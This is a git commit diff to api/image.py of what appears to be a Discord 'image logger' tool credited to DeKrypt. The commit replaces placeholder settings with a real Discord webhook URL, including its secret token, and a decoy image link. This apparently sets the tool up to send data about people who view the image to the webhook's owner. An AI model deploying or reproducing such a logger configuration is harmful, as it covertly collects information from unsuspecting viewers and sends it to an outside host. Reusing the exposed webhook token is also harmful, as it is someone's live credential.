7097a06c7eae4cc925c40cbc134c0630351ec4a5
tssingh9912-cloud <ts.singh9912@gmail.com>
2026-01-21 22:08:18 +0000

    Update webhook and image URL in config

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1463655539312693424/mgITjx9kGhVmF0p9PNrBtzeln6Qv5o2-rOsk4QWBRAsJzJbrER2_PKnbP6PoHb5IazxU",
+    "image": "https://media.tenor.com/jqRrOBrrR2oAAAAe/ai-baby.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
